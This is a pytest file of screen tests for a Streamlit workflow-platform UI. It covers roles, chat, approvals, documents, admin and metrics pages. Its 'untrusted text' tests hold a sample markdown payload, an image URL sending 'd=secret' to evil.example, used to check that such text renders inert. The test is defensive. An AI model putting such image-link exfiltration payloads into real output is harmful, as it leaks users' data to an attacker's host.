"""Screen tests: the real Streamlit pages run under ``AppTest`` against an in-memory API stub.

What is checked: what each role sees, that buttons call the right API method with the right
arguments, that API refusals are shown (not raised), and that sign-out clears the session.
"""

from __future__ import annotations

from pathlib import Path

import pytest
from streamlit.testing.v1 import AppTest

from tests.ui import stub_api as stub
from ui import state
from ui.api_client import ApiError

APP = str(Path(__file__).resolve().parents[2] / "ui" / "streamlit_app.py")

ADMIN = stub.user("admin@demo.local", "admin")
OPERATOR = stub.user("operator@demo.local", "operator")
APPROVER = stub.user("approver@demo.local", "approver")
VIEWER = stub.user("viewer@demo.local", "viewer")


def open_app(api: stub.StubApi, page: str | None = None) -> AppTest:
    at = AppTest.from_file(APP, default_timeout=15)
    at.session_state["api"] = api
    if page:
        at.session_state[state.NAV_KEY] = page
    return at.run()


def texts(at: AppTest) -> str:
    """All visible text on the page, for loose 'does it say X' assertions."""
    parts = [el.value for el in (*at.markdown, *at.caption, *at.info, *at.warning, *at.error)]
    parts += [el.value for el in at.success] + [el.value for el in at.subheader]
    parts += [el.value for el in at.header]
    return "\n".join(str(p) for p in parts)


def click(at: AppTest, label: str) -> AppTest:
    """Click the (main-area) button with this label, then rerun."""
    (button,) = [b for b in at.main.button if b.label == label]
    return button.click().run()


def no_exception(at: AppTest) -> None:
    assert not at.exception, [e.value for e in at.exception]


# --------------------------------------------------------------------------- login / shell
def test_login_form_is_shown_when_signed_out_and_signs_in() -> None:
    api = stub.StubApi()
    at = open_app(api)
    assert at.title[0].value.endswith("Workflow Platform")
    at.text_input[0].set_value("operator@demo.local")
    at.text_input[1].set_value("pw")
    at.button[0].click().run()
    no_exception(at)
    assert api.is_authenticated
    assert at.sidebar.radio(key=state.NAV_KEY).value == state.PAGE_CHAT


def test_login_failure_is_shown_and_user_stays_out() -> None:
    api = stub.StubApi()
    at = open_app(api)
    at.text_input[0].set_value("operator@demo.local")
    at.text_input[1].set_value("wrong")
    at.button[0].click().run()
    assert not api.is_authenticated
    assert "Invalid email or password" in texts(at)


def test_demo_hint_only_when_opted_in(monkeypatch: pytest.MonkeyPatch) -> None:
    assert not open_app(stub.StubApi()).expander
    monkeypatch.setenv("UI_SHOW_DEMO_HINT", "true")
    assert "Demo accounts" in [e.label for e in open_app(stub.StubApi()).expander]


@pytest.mark.parametrize(
    ("account", "admin_visible"), [(ADMIN, True), (OPERATOR, False), (VIEWER, False)]
)
def test_admin_page_only_listed_for_admins(account: dict, admin_visible: bool) -> None:  # type: ignore[type-arg]
    at = open_app(stub.StubApi(account))
    options = at.sidebar.radio(key=state.NAV_KEY).options
    assert (state.PAGE_ADMIN in options) is admin_visible
    assert state.PAGE_RUN in options


def test_sign_out_clears_the_session_and_shows_login() -> None:
    api = stub.StubApi(OPERATOR)
    at = open_app(api)
    at.sidebar.button[0].click().run()
    assert not api.is_authenticated
    assert api.called("logout")
    assert at.title[0].value.endswith("Workflow Platform")
    assert state.NAV_KEY not in at.session_state


def test_expired_session_warns_and_signs_out() -> None:
    api = stub.StubApi(OPERATOR)
    api.fail["list_conversations"] = ApiError(401, "session_expired", "Session expired")
    at = open_app(api)
    assert not api.is_authenticated
    assert at.title[0].value.endswith("Workflow Platform")  # back on the login screen
    assert "Session expired" in [w.value for w in at.warning]  # ...with the reason


def test_other_api_errors_are_shown_not_raised() -> None:
    api = stub.StubApi(OPERATOR)
    api.fail["list_conversations"] = ApiError(500, "internal_error", "Boom", request_id="r1")
    at = open_app(api)
    no_exception(at)
    assert "Boom (request r1)" in [e.value for e in at.error]
    assert api.is_authenticated


# --------------------------------------------------------------------------- new workflow
def test_new_workflow_submits_and_jumps_to_the_run() -> None:
    api = stub.StubApi(OPERATOR)
    at = open_app(api, state.PAGE_NEW)
    at.text_area(key="new_goal").set_value("Calculate 2+2")
    at.slider[0].set_value(1)
    click(at, "Start workflow")
    no_exception(at)
    (goal,) = api.called("create_workflow")
    assert goal == ("Calculate 2+2",)
    kwargs = next(k for n, _, k in api.calls if n == "create_workflow")
    assert kwargs["max_revisions"] == 1
    assert kwargs["idempotency_key"]
    assert at.session_state[state.SELECTED_RUN_KEY] == "run-new-0000000"
    assert at.sidebar.radio(key=state.NAV_KEY).value == state.PAGE_RUN


def test_new_workflow_example_button_fills_the_goal() -> None:
    at = open_app(stub.StubApi(OPERATOR), state.PAGE_NEW)
    at.button[0].click().run()
    assert "refund window" in at.text_area(key="new_goal").value


def test_new_workflow_rejects_too_short_goal() -> None:
    api = stub.StubApi(OPERATOR)
    at = open_app(api, state.PAGE_NEW)
    at.text_area(key="new_goal").set_value("hi")
    click(at, "Start workflow")
    assert not api.called("create_workflow")
    assert "at least 3 characters" in texts(at)


def test_new_workflow_shows_api_refusal() -> None:
    api = stub.StubApi(OPERATOR)
    api.fail["create_workflow"] = ApiError(429, "rate_limited", "Slow down")
    at = open_app(api, state.PAGE_NEW)
    at.text_area(key="new_goal").set_value("Calculate 2+2")
    click(at, "Start workflow")
    assert "Slow down" in [e.value for e in at.error]
    assert at.sidebar.radio(key=state.NAV_KEY).value == state.PAGE_NEW


def test_viewer_cannot_start_workflows() -> None:
    at = open_app(stub.StubApi(VIEWER), state.PAGE_NEW)
    assert not at.text_area
    assert "viewer" in texts(at)


# --------------------------------------------------------------------------- chat
def test_chat_without_conversations_prompts_to_create_one() -> None:
    api = stub.StubApi(OPERATOR)
    api.conversations = []
    at = open_app(api, state.PAGE_CHAT)
    assert "Create a conversation" in texts(at)
    at.text_input(key="new_conversation_title").set_value("Planning")
    at.button(key="create_conversation").click().run()
    assert api.called("create_conversation") == [("Planning",)]


def test_chat_lists_messages_with_open_run_buttons() -> None:
    api = stub.StubApi(OPERATOR)
    api.messages = [
        {"id": "m1", "role": "user", "content": "hello", "run_id": "run-1111111111"},
        {"id": "m2", "role": "assistant", "content": "hi there", "run_id": None},
    ]
    at = open_app(api, state.PAGE_CHAT)
    assert [m.name for m in at.chat_message] == ["user", "assistant"]
    at.button(key="run-m1").click().run()
    assert at.sidebar.radio(key=state.NAV_KEY).value == state.PAGE_RUN
    assert at.session_state[state.SELECTED_RUN_KEY] == "run-1111111111"


def test_chat_send_shows_the_summary_of_a_completed_run() -> None:
    api = stub.StubApi(OPERATOR)
    at = open_app(api, state.PAGE_CHAT)
    at.chat_input[0].set_value("What is 2+2?").run()
    no_exception(at)
    (call,) = [(a, k) for n, a, k in api.calls if n == "create_workflow"]
    assert call[0] == ("What is 2+2?",)
    assert call[1]["conversation_id"] == "conv-1"
    assert "The answer is 2." in texts(at)  # the reply now comes from the conversation history
    assert at.sidebar.radio(key=state.NAV_KEY).value == state.PAGE_CHAT
    assert "chat_outcome" not in at.session_state


def test_chat_send_stops_at_approval_and_points_to_inbox() -> None:
    api = stub.StubApi(OPERATOR)
    api.workflow_status = "AWAITING_APPROVAL"
    at = open_app(api, state.PAGE_CHAT)
    at.chat_input[0].set_value("Email ops").run()
    assert "needs a human approval" in texts(at)
    at.button(key="chat-go-approvals").click().run()
    assert at.sidebar.radio(key=state.NAV_KEY).value == state.PAGE_APPROVALS


def test_chat_send_reports_failure_and_refusal() -> None:
    api = stub.StubApi(OPERATOR)
    api.workflow_status = "FAILED"
    at = open_app(api, state.PAGE_CHAT)
    at.chat_input[0].set_value("do it").run()
    assert "ended as FAILED" in "\n".join(e.value for e in at.error)
    api.fail["create_workflow"] = ApiError(403, "forbidden", "Not allowed")
    at.chat_input[0].set_value("again").run()
    assert "Not allowed" in [e.value for e in at.error]


def test_chat_still_working_after_the_deadline(monkeypatch: pytest.MonkeyPatch) -> None:
    from ui.views import chat

    monkeypatch.setattr(chat, "MAX_WAIT_SECONDS", -1.0)
    api = stub.StubApi(OPERATOR)
    api.workflow_status = "EXECUTING"
    at = open_app(api, state.PAGE_CHAT)
    at.chat_input[0].set_value("slow").run()
    assert "Still working" in texts(at)
    at.button(key="chat-open-run").click().run()
    assert at.sidebar.radio(key=state.NAV_KEY).value == state.PAGE_RUN


def test_chat_viewer_reads_only_and_archive_works() -> None:
    viewer_api = stub.StubApi(VIEWER)
    at = open_app(viewer_api, state.PAGE_CHAT)
    assert not at.chat_input
    api = stub.StubApi(OPERATOR)
    at = open_app(api, state.PAGE_CHAT)
    at.button(key="archive_conversation").click().run()
    assert api.called("archive_conversation") == [("conv-1",)]


# --------------------------------------------------------------------------- run timeline
def test_timeline_shows_a_completed_run() -> None:
    at = open_app(stub.StubApi(OPERATOR), state.PAGE_RUN)
    no_exception(at)
    assert "The answer is 2." in [s.value for s in at.success]
    metrics = {m.label: m.value for m in at.metric}
    assert metrics["LLM calls"] == "1"
    assert metrics["Tokens in / out"] == "10 / 5"
    assert metrics["Cost"] == "$0.0010"
    assert metrics["Tool calls"] == "1"
    assert not [b for b in at.button if b.key == "cancel-run"]  # final -> nothing to cancel


def test_timeline_with_no_runs() -> None:
    api = stub.StubApi(OPERATOR)
    api.runs = []
    assert "No workflow runs yet" in texts(open_app(api, state.PAGE_RUN))


def test_timeline_running_run_can_be_cancelled() -> None:
    api = stub.StubApi(OPERATOR)
    api.timelines["run-1111111111"] = stub.timeline("EXECUTING", [stub.step("calc", "RUNNING")])
    at = open_app(api, state.PAGE_RUN)
    no_exception(at)
    at.button(key="cancel-run").click().run()
    assert api.called("cancel_workflow") == [("run-1111111111",)]


def test_timeline_cancel_refusal_is_shown() -> None:
    api = stub.StubApi(OPERATOR)
    api.timelines["run-1111111111"] = stub.timeline("EXECUTING")
    api.fail["cancel_workflow"] = ApiError(409, "conflict", "Run is already COMPLETED")
    at = open_app(api, state.PAGE_RUN)
    at.button(key="cancel-run").click().run()
    assert "Run is already COMPLETED" in [e.value for e in at.error]


def test_timeline_failed_run_offers_retry_of_the_failed_step() -> None:
    api = stub.StubApi(OPERATOR)
    failed = stub.step("calc", "FAILED", error="boom")
    api.timelines["run-1111111111"] = stub.timeline("FAILED", [failed])
    at = open_app(api, state.PAGE_RUN)
    assert "boom" in [e.value for e in at.error]
    at.button(key="retry-step").click().run()
    assert api.called("retry_step") == [("run-1111111111", "step-calc")]
    api.fail["retry_step"] = ApiError(409, "conflict", "Only a FAILED step can be retried")
    at.button(key="retry-step").click().run()
    assert "Only a FAILED step can be retried" in [e.value for e in at.error]


def test_timeline_viewer_gets_no_retry_button() -> None:
    api = stub.StubApi(VIEWER)
    api.timelines["run-1111111111"] = stub.timeline("FAILED", [stub.step("calc", "FAILED")])
    at = open_app(api, state.PAGE_RUN)
    assert not [b for b in at.button if b.key == "retry-step"]


def test_timeline_awaiting_approval_links_to_inbox_and_lists_approvals() -> None:
    api = stub.StubApi(OPERATOR)
    tl = stub.timeline("AWAITING_APPROVAL")
    tl["approvals"] = [stub.approval(comment="looks fine")]
    api.timelines["run-1111111111"] = tl
    at = open_app(api, state.PAGE_RUN)
    assert "requested by **operator\\@\u200bdemo.local**" in texts(at)
    at.button(key="goto-approvals").click().run()
    assert at.sidebar.radio(key=state.NAV_KEY).value == state.PAGE_APPROVALS


def test_timeline_unknown_selected_run_shows_the_api_error() -> None:
    api = stub.StubApi(OPERATOR)
    api.fail["timeline"] = ApiError(404, "not_found", "Workflow run not found")
    at = open_app(api, state.PAGE_RUN)
    assert "Workflow run not found" in [e.value for e in at.error] or "Workflow run not found" in (
        texts(at)
    )


def test_timeline_selected_run_missing_from_list_is_still_offered() -> None:
    api = stub.StubApi(OPERATOR)
    api.runs = []
    at = AppTest.from_file(APP, default_timeout=15)
    at.session_state["api"] = api
    at.session_state[state.NAV_KEY] = state.PAGE_RUN
    at.session_state[state.SELECTED_RUN_KEY] = "run-1111111111"
    at.run()
    assert at.selectbox(key="run_pick").value == "run-1111111111"


def test_timeline_live_run_turning_final_reruns_the_page() -> None:
    api = stub.StubApi(OPERATOR)
    api.timelines["run-1111111111"] = stub.timeline("EXECUTING")
    at = open_app(api, state.PAGE_RUN)
    assert at.session_state["_run_was_live"] is True
    api.timelines["run-1111111111"] = stub.timeline("COMPLETED")
    at.run()  # same effect as the fragment's next poll noticing the final state
    no_exception(at)
    assert at.session_state["_run_was_live"] is False
    assert "The answer is 2." in [s.value for s in at.success]


# --------------------------------------------------------------------------- approvals
def test_approvals_empty_states() -> None:
    api = stub.StubApi(APPROVER)
    api.approvals = []
    at = open_app(api, state.PAGE_APPROVALS)
    assert "No pending approvals." in [s.value for s in at.success]
    at.radio[0].set_value("APPROVED").run()
    assert "No approved approvals." in [c.value for c in at.caption]


def test_approver_approves_with_comment() -> None:
    api = stub.StubApi(APPROVER)
    at = open_app(api, state.PAGE_APPROVALS)
    no_exception(at)
    at.text_input(key="comment-appr-1").set_value("ok")
    at.button(key="approve-appr-1").click().run()
    assert api.called("approve") == [("appr-1", "ok")]


def test_reject_requires_a_comment() -> None:
    api = stub.StubApi(APPROVER)
    at = open_app(api, state.PAGE_APPROVALS)
    at.button(key="reject-appr-1").click().run()
    assert not api.called("reject")
    assert "explain the rejection" in texts(at)
    at.text_input(key="comment-appr-1").set_value("too risky")
    at.button(key="reject-appr-1").click().run()
    assert api.called("reject") == [("appr-1", "too risky")]


def test_decision_refusal_is_shown() -> None:
    api = stub.StubApi(APPROVER)
    api.fail["approve"] = ApiError(403, "forbidden", "Not allowed to decide")
    at = open_app(api, state.PAGE_APPROVALS)
    at.button(key="approve-appr-1").click().run()
    assert "Not allowed to decide" in [e.value for e in at.error]


def test_own_request_shows_separation_of_duties_without_buttons() -> None:
    api = stub.StubApi(stub.user("operator@demo.local", "operator", "approver"))
    at = open_app(api, state.PAGE_APPROVALS)
    assert "separation of duties" in texts(at)
    assert not [b for b in at.button if b.key in {"approve-appr-1", "reject-appr-1"}]


def test_operator_sees_cards_but_cannot_decide() -> None:
    at = open_app(stub.StubApi(stub.user("other@demo.local", "operator")), state.PAGE_APPROVALS)
    assert "Only approvers and admins" in texts(at)
    assert not [b for b in at.button if b.key == "approve-appr-1"]


def test_decided_approval_shows_comment_and_view_run_jumps() -> None:
    api = stub.StubApi(APPROVER)
    api.approvals = [stub.approval(status="REJECTED", comment="no thanks")]
    at = open_app(api, state.PAGE_APPROVALS)
    at.radio[0].set_value("REJECTED").run()
    assert "Comment: no thanks" in texts(at)
    at.button(key="view-appr-1").click().run()
    assert at.sidebar.radio(key=state.NAV_KEY).value == state.PAGE_RUN


# --------------------------------------------------------------------------- documents
def test_documents_paste_and_ingest() -> None:
    api = stub.StubApi(OPERATOR)
    at = open_app(api, state.PAGE_DOCS)
    no_exception(at)
    at.text_area(key="doc_text").set_value("Refunds take 14 days.")
    at.text_input(key="doc_title").set_value("Policy")
    at.button(key="doc_ingest").click().run()
    assert api.called("upload_document") == [("Policy", "Refunds take 14 days.")]
    assert "Ingested" in texts(at)


def test_documents_need_title_and_text_and_show_refusals() -> None:
    api = stub.StubApi(OPERATOR)
    at = open_app(api, state.PAGE_DOCS)
    at.button(key="doc_ingest").click().run()
    assert not api.called("upload_document")
    assert "title and some text" in texts(at)
    api.fail["upload_document"] = ApiError(422, "validation_error", "Too large")
    at.text_area(key="doc_text").set_value("x")
    at.text_input(key="doc_title").set_value("T")
    at.button(key="doc_ingest").click().run()
    assert "Too large" in [e.value for e in at.error]


def test_documents_duplicate_content_is_reported() -> None:
    api = stub.StubApi(OPERATOR)
    original = api.upload_document

    def duplicate(title: str, content: str) -> dict:  # type: ignore[type-arg]
        result = original(title, content)
        result["created"] = False
        return result

    api.upload_document = duplicate  # type: ignore[method-assign]
    at = open_app(api, state.PAGE_DOCS)
    at.text_area(key="doc_text").set_value("same")
    at.text_input(key="doc_title").set_value("Dup")
    at.button(key="doc_ingest").click().run()
    assert "already in the library" in texts(at)


def test_documents_library_delete_and_search() -> None:
    api = stub.StubApi(OPERATOR)
    api.documents = [
        {
            "id": "d1",
            "title": "Policy",
            "chunk_count": 3,
            "source": "upload",
            "created_at": stub.NOW,
        }
    ]
    at = open_app(api, state.PAGE_DOCS)
    assert "Policy" in texts(at)
    at.text_input(key="doc_query").set_value("refund").run()
    assert api.called("search_documents") == [("refund",)]
    assert "Refunds within 14 days." in texts(at)
    at.button(key="del-d1").click().run()
    assert api.called("delete_document") == [("d1",)]
    assert "The library is empty." in texts(at)


def test_documents_empty_search_and_viewer_cannot_upload() -> None:
    api = stub.StubApi(VIEWER)
    api.search_documents = lambda *a, **k: []  # type: ignore[method-assign,assignment]
    at = open_app(api, state.PAGE_DOCS)
    assert "not add to it" in texts(at)
    at.text_input(key="doc_query").set_value("nothing").run()
    assert "No matching passages." in texts(at)


# --------------------------------------------------------------------------- admin
def test_admin_changes_roles() -> None:
    api = stub.StubApi(ADMIN)
    at = open_app(api, state.PAGE_ADMIN)
    no_exception(at)
    at.multiselect(key="roles-u1").set_value(["viewer", "operator"]).run()
    at.button(key="save-roles-u1").click().run()
    assert api.called("set_roles") == [("u1", ["viewer", "operator"])]


def test_admin_deactivates_account_and_shows_refusals() -> None:
    api = stub.StubApi(ADMIN)
    at = open_app(api, state.PAGE_ADMIN)
    at.toggle(key="active-u1").set_value(False).run()
    assert api.called("set_active") == [("u1", False)]
    api.fail["set_active"] = ApiError(409, "conflict", "Cannot deactivate yourself")
    at.toggle(key="active-u1").set_value(True).run()  # the stub now says False, so this changes it
    assert "Cannot deactivate yourself" in [e.value for e in at.error]


def test_admin_audit_log_filters_and_pages() -> None:
    api = stub.StubApi(ADMIN)
    api.audit = {
        "total": 1,
        "items": [
            {"created_at": stub.NOW, "actor_email": None, "action": "auth.login",
             "resource_type": None, "resource_id": None, "outcome": "SUCCESS", "ip_address": None}
        ],
    }  # fmt: skip
    at = open_app(api, state.PAGE_ADMIN)
    assert "1 entries" in texts(at)
    at.text_input(key="audit_action").set_value("auth.login").run()
    at.number_input(key="audit_page").set_value(2).run()
    last = [k for n, _, k in api.calls if n == "audit_logs"][-1]
    assert last["action"] == "auth.login"
    assert last["offset"] == 25


def test_admin_page_refuses_non_admin_even_if_forced() -> None:
    from ui.views import admin

    at = AppTest.from_function(lambda: None)  # placeholder to keep AppTest import used
    del at
    api = stub.StubApi(OPERATOR)
    at = AppTest.from_file(APP, default_timeout=15)
    at.session_state["api"] = api
    at.session_state[state.NAV_KEY] = state.PAGE_ADMIN
    at.run()
    # the radio only offers allowed pages, so the forced value falls back to a visible one
    assert at.sidebar.radio(key=state.NAV_KEY).value != state.PAGE_ADMIN
    assert admin.ROLES  # the module itself also guards, see test_views_guard below


# --------------------------------------------------------------------------- metrics
METRICS = """\
# TYPE http_requests_total counter
http_requests_total{method="GET",route="/x",status="200"} 10
http_requests_total{method="GET",route="/x",status="500"} 2
# TYPE workflow_runs_total counter
workflow_runs_total{status="COMPLETED"} 4
workflow_runs_total{status="FAILED"} 1
# TYPE llm_tokens_total counter
llm_tokens_total{kind="prompt"} 100
llm_tokens_total{kind="completion"} 50
# TYPE llm_cost_usd_total counter
llm_cost_usd_total 0.25
# TYPE cache_operations_total counter
cache_operations_total{cache="a",result="hit"} 3
cache_operations_total{cache="a",result="miss"} 1
# TYPE tool_executions_total counter
tool_executions_total{tool="t",status="failed"} 2
# TYPE circuit_breaker_open gauge
circuit_breaker_open{breaker="llm"} 1
"""


def test_metrics_summary() -> None:
    api = stub.StubApi(VIEWER)
    api.metrics = METRICS
    at = open_app(api, state.PAGE_METRICS)
    no_exception(at)
    values = {m.label: m.value for m in at.metric}
    assert values["HTTP requests"] == "12"
    assert values["Server errors (5xx)"] == "2"
    assert values["Runs completed"] == "4"
    assert values["Tokens in"] == "100"
    assert values["Estimated spend"] == "$0.2500"
    assert values["Cache hit ratio"] == "75%"
    assert values["Tool failures"] == "2"
    assert at.dataframe[0].value.iloc[0]["state"] == "open"
    assert "API ready" in next(s.value for s in at.success)


def test_metrics_unavailable_and_not_ready() -> None:
    api = stub.StubApi(VIEWER)
    api.fail["metrics_text"] = ApiError(401, "unauthorized", "metrics token required")
    api.ready = {"status": "not_ready", "checks": {"database": False}}
    at = open_app(api, state.PAGE_METRICS)
    assert "Metrics are not available" in next(w.value for w in at.warning)
    assert "database: DOWN" in next(e.value for e in at.error)
    api.fail["readiness"] = ApiError(0, "unreachable", "API unreachable")
    api.metrics = ""
    del api.fail["metrics_text"]
    at = open_app(api, state.PAGE_METRICS)
    assert "API unreachable" in [e.value for e in at.error]
    no_exception(at)


# --------------------------------------------------------------------------- untrusted text
HOSTILE = "[win a prize](http://evil.example) ![t](http://evil.example/p.png?d=secret)"


def markdown_values(at: AppTest) -> str:
    return "\n".join(str(m.value) for m in at.markdown)


def test_hostile_text_is_shown_literally_in_chat_and_timeline() -> None:
    api = stub.StubApi(OPERATOR)
    api.messages = [{"id": "m1", "role": "assistant", "content": HOSTILE, "run_id": None}]
    at = open_app(api, state.PAGE_CHAT)
    shown = markdown_values(at)
    assert HOSTILE not in shown  # the raw (renderable) form never reaches Streamlit
    assert "\\[win a prize\\]\\(http" in shown

    tl = stub.timeline()
    tl["run"]["goal"] = HOSTILE
    api.timelines["run-1111111111"] = tl
    api.runs = [stub.run(goal=HOSTILE)]
    at = open_app(api, state.PAGE_RUN)
    assert HOSTILE not in markdown_values(at)


def test_hostile_text_is_shown_literally_in_approvals_and_documents() -> None:
    api = stub.StubApi(APPROVER)
    api.approvals = [stub.approval(reason=HOSTILE, goal=HOSTILE)]
    shown = markdown_values(open_app(api, state.PAGE_APPROVALS))
    assert HOSTILE not in shown

    api = stub.StubApi(OPERATOR)
    api.search_documents = lambda *a, **k: [  # type: ignore[method-assign,assignment]
        {"citation": "[Doc #1]", "score": 0.9, "content": HOSTILE}
    ]
    at = open_app(api, state.PAGE_DOCS)
    at.text_input(key="doc_query").set_value("anything").run()
    assert HOSTILE not in markdown_values(at)


# --------------------------------------------------------------------------- deep research UI
def test_deep_example_ticks_the_checkbox_and_creates_a_deep_run() -> None:
    api = stub.StubApi(OPERATOR)
    at = open_app(api, state.PAGE_NEW)
    next(b for b in at.button if b.label == "Deep research").click().run()
    assert at.checkbox(key="new_deep").value is True
    click(at, "Start workflow")
    kwargs = next(k for n, _, k in api.calls if n == "create_workflow")
    assert kwargs["mode"] == "deep"
    assert api.called("similar_runs")


def test_standard_goal_never_asks_for_similar_runs() -> None:
    api = stub.StubApi(OPERATOR)
    at = open_app(api, state.PAGE_NEW)
    at.text_area(key="new_goal").set_value("Calculate 2+2")
    click(at, "Start workflow")
    assert not api.called("similar_runs")
    assert next(k for n, _, k in api.calls if n == "create_workflow")["mode"] == "standard"


def test_similar_earlier_research_is_offered_before_starting() -> None:
    api = stub.StubApi(OPERATOR)
    api.similar = [{"id": "run-old", "goal": "Refund research", "mode": "deep", "similarity": 0.91}]
    at = open_app(api, state.PAGE_NEW)
    at.checkbox(key="new_deep").set_value(True)
    at.text_area(key="new_goal").set_value("Deep research on refunds")
    click(at, "Start workflow")
    assert not api.called("create_workflow")  # nothing started yet
    assert "91% similar" in texts(at)
    at.button(key="research-again").click().run()
    assert api.called("create_workflow") == [("Deep research on refunds",)]


def test_similar_earlier_research_can_be_opened() -> None:
    api = stub.StubApi(OPERATOR)
    api.similar = [{"id": "run-old", "goal": "Refund research", "mode": "deep", "similarity": 0.8}]
    at = open_app(api, state.PAGE_NEW)
    at.checkbox(key="new_deep").set_value(True)
    at.text_area(key="new_goal").set_value("Deep research on refunds")
    click(at, "Start workflow")
    at.button(key="open-earlier-run-old").click().run()
    assert at.session_state[state.SELECTED_RUN_KEY] == "run-old"
    assert not api.called("create_workflow")


def test_similar_lookup_failure_does_not_block_the_run() -> None:
    api = stub.StubApi(OPERATOR)
    api.fail["similar_runs"] = ApiError(500, "boom", "down")
    at = open_app(api, state.PAGE_NEW)
    at.checkbox(key="new_deep").set_value(True)
    at.text_area(key="new_goal").set_value("Deep research on refunds")
    click(at, "Start workflow")
    assert api.called("create_workflow")


def report_timeline() -> dict[str, object]:
    tl = stub.timeline()
    tl["run"]["result"] = {  # type: ignore[index]
        "summary": "# Report\n\n| A | B |\n|---|---|\n| x | ![i](http://evil/x.png) |\n",
        "confidence": {"label": "high", "score": 0.91, "sources": 4, "coverage": 1.0},
    }
    return tl


def test_report_is_shown_with_confidence_and_downloads() -> None:
    api = stub.StubApi(OPERATOR)
    api.timelines["run-1111111111"] = report_timeline()
    at = open_app(api, state.PAGE_RUN)
    no_exception(at)
    metrics = {m.label: m.value for m in at.metric}
    assert metrics["Confidence"] == "high (0.91)" and metrics["Sources cited"] == "4"
    assert metrics["Questions answered"] == "100%"
    shown = "\n".join(m.value for m in at.markdown)
    assert "![i]" not in shown and "\\!\\[i\\]" in shown  # images stay inert text
    assert api.called("download_report") == [("run-1111111111", "pdf"), ("run-1111111111", "md")]


def test_follow_up_question_is_asked_and_answered() -> None:
    api = stub.StubApi(OPERATOR)
    api.timelines["run-1111111111"] = report_timeline()
    at = open_app(api, state.PAGE_RUN)
    at.text_input(key="ask-run-1111111111").set_value("When are goods refundable?")
    at.button(key="ask-followup").click().run()
    assert api.called("ask_followup") == [("run-1111111111", "When are goods refundable?")]
    assert "Refundable until activation" in texts(at) and "Refund \\#1" in texts(at)


def test_follow_up_refusal_is_shown() -> None:
    api = stub.StubApi(OPERATOR)
    api.timelines["run-1111111111"] = report_timeline()
    api.fail["ask_followup"] = ApiError(409, "conflict", "This run has no finished report yet")
    at = open_app(api, state.PAGE_RUN)
    at.text_input(key="ask-run-1111111111").set_value("When are goods refundable?")
    at.button(key="ask-followup").click().run()
    assert "This run has no finished report yet" in [e.value for e in at.error]


def test_viewer_sees_the_report_but_cannot_ask() -> None:
    api = stub.StubApi(VIEWER)
    api.timelines["run-1111111111"] = report_timeline()
    at = open_app(api, state.PAGE_RUN)
    assert not at.text_input
    assert api.called("download_report")


def test_download_failure_is_a_warning_not_a_crash() -> None:
    api = stub.StubApi(OPERATOR)
    api.timelines["run-1111111111"] = report_timeline()
    api.fail["download_report"] = ApiError(409, "conflict", "no report")
    at = open_app(api, state.PAGE_RUN)
    no_exception(at)
    assert "no report" in [w.value for w in at.warning]
